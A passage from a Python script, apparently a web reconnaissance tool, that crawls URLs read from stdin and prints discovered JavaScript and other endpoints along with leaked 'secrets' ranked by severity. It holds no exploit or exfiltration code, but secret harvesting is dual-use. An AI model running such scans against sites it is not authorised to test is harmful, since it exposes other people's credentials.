    parser.add_argument('-m', '--mode', choices=['endpoints', 'secrets', 'both'], default='both',
                        help="Specify what to hunt for: endpoints, secrets, or both (default: both)")
    parser.add_argument('-v', '--verbose', action='store_true',
                        help="Enable verbose output")
    parser.add_argument('-t', '--threads', type=int, default=10,
                        help="Number of threads to use for I/O-bound operations (default: 10)")
    args = parser.parse_args()

    if args.verbose:
        logger.setLevel(logging.DEBUG)

    logger.info("Starting main function")
    logger.info(f"Mode: {args.mode}, Verbose: {args.verbose}, Threads: {args.threads}")

    all_js_urls = set()
    all_non_js_urls = set()
    all_secrets = []
    processed_urls = set()

    loop = asyncio.get_event_loop()

    async with aiohttp.ClientSession() as session:
        for initial_url in sys.stdin:
            initial_url = initial_url.strip()
            if initial_url:
                logger.debug(f"Processing URL: {initial_url}")
                js_urls, non_js_urls, secrets = await recursive_process(initial_url, session, processed_urls, args.verbose, loop)
                all_js_urls.update(js_urls)
                all_non_js_urls.update(non_js_urls)
                all_secrets.extend(secrets)


    if args.mode in ['endpoints', 'both']:
        logger.info("Printing endpoints")
        for url in sorted(all_js_urls):
            print(f"[JS] {url}")
        for url in sorted(all_non_js_urls):
            print(f"[Non-JS] {url}")

    if args.mode in ['secrets', 'both']:
        logger.info("Processing and printing secrets")
        sorted_secrets = sorted(all_secrets, key=lambda x: (-severity_to_int(x['severity']), json.dumps(x)))
        unique_secrets = list(OrderedDict((json.dumps(secret), secret) for secret in sorted_secrets).values())

        for secret in unique_secrets:
            print(json.dumps(secret))


if __name__ == "__main__":
    asyncio.run(main())
